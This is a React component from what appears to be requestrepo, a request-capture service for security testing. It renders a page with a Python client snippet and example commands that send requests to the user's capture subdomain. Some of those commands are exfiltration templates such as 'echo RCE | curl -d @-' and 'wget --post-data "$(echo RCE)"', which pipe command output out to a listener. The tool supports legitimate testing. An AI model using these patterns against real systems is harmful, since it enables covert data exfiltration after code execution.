import React, { Component } from "react";
import { RequestInfo } from "./request-info";
import { EditorComponent } from "./editor";
import { Button } from "primereact/button";
import { toast } from "react-toastify";
import { Utils } from "../utils";

export class RequestsPage extends Component {
  constructor(props) {
    super(props);
    this.state = {
      isEditorFocused: false,
      user: null,
      selectedRequest: null,
      loading: true,
      error: null,
    };
  }

  handleEditorFocus = () => {
    this.setState({ isEditorFocused: true });
  };

  handleEditorBlur = () => {
    this.setState({ isEditorFocused: false });
  };
  render() {
    const { user } = this.props;

    if (!user) {
      return (
        <div className="card card-w-title card-body">
          <h1>No Session Available</h1>
          <p>Please create or select a session to continue.</p>
        </div>
      );
    }

    const activeSession = Utils.getActiveSession();

    const token = this.state.isEditorFocused
      ? activeSession.token
      : "********";

    // parse url into host:port
    let url;
    try {
      url = new URL(
        "http://" + (user?.domain || window.location.hostname) + "/",
      );
    } catch {
      url = new URL("http://" + window.location.hostname + "/");
    }
    let port = url.port;
    if (!port) port = window.location.protocol === "https:" ? 443 : 80;

    const content = `from requestrepo import Requestrepo # pip install requestrepo
client = Requestrepo(token="${token}", host="${url.hostname}", port=${port}, protocol="${port === 443 ? "https" : "http"}")

print(client.subdomain) # ${user.subdomain}
print(client.domain) # ${user.subdomain}.${user.domain}

client.update_http(raw=b"hello world")

# Get the latest request (blocks until one is received)
new_request = client.get_request()
print("Latest Request:", new_request)`;

    return (
      <div className="card card-w-title card-body">
        {user?.requests &&
          user?.selectedRequest !== undefined &&
          (!user?.requests[user?.selectedRequest] ||
            user?.requests?.length === 0) && (
            <div className="grid">
              <div className="col-12">
                <h1>Awaiting requests</h1>
                <p>How to make a request:</p>
                <code>
                  curl http://
                  {user?.url || `${user?.subdomain}.${user?.domain}`}
                </code>
                <br />
                <br />
                <code>
                  curl http://{user.domain}/r/
                  {user?.subdomain || "default"}/
                </code>
                <br />
                <br />
                <code>
                  curl -X POST --data hello http://
                  {user?.url || `${user?.subdomain}.${user?.domain}`}
                </code>
                <br />
                <br />
                <code>
                  nslookup your.data.here.
                  {user?.url || `${user?.subdomain}.${user?.domain}`}
                </code>
                <br />
                <br />
                <code>
                  echo RCE | curl -d @-{" "}
                  {user?.url || `${user?.subdomain}.${user?.domain}`}
                </code>
                <br />
                <br />
                <code>
                  wget --post-data "$(echo RCE)" -O-{" "}
                  {user?.url || `${user?.subdomain}.${user?.domain}`}
                </code>
                <br />
                <br />
                <p>
                  Check out the Response tab to edit your HTTP Response or the
                  DNS tab to add DNS records for this subdomain.
                </p>
                <p>
                  Automate requests/responses using the{" "}
                  <a
                    href="https://github.com/adrgs/requestrepo-lib"
                    target="_blank"
                    rel="noreferrer"
                  >
                    requestrepo
                  </a>{" "}
                  Python library:
                </p>
                <CopyButton
                  text={content.replace(
                    "********",
                    activeSession.token,
                  )}
                />
                <EditorComponent
                  value={content}
                  onChange={() => {}}
                  commands={[]}
                  language={"python"}
                  onFocus={this.handleEditorFocus}
                  onBlur={this.handleEditorBlur}
                />
              </div>
            </div>
          )}
        {user.requests &&
          user?.selectedRequest !== undefined &&
          user?.requests[user?.selectedRequest] && (
            <RequestInfo request={user.requests[user.selectedRequest]} />
          )}
      </div>
    );
  }
}

export const CopyButton = ({ text }) => {
  const handleCopy = () => {
    navigator.clipboard
      .writeText(text)
      .then(() =>
        toast.info("Python code copied to clipboard!", {
          position: "bottom-center",
          autoClose: 2500,
          hideProgressBar: false,
          closeOnClick: true,
          pauseOnHover: true,
          draggable: true,
          dark: Utils.isDarkTheme(),
        }),
      )
      .catch(() =>
        toast.error("Failed to copy Python code to clipboard!", {
          position: "bottom-center",
          autoClose: 2500,
          hideProgressBar: false,
          closeOnClick: true,
          pauseOnHover: true,
          draggable: true,
          dark: Utils.isDarkTheme(),
        }),
      );
  };

  return (
    <Button
      label="Copy"
      className="p-button-outlined p-button-secondary"
      style={{ padding: "0.5rem", marginBottom: "1rem" }}
      icon="pi pi-copy"
      onClick={handleCopy}
    />
  );
};
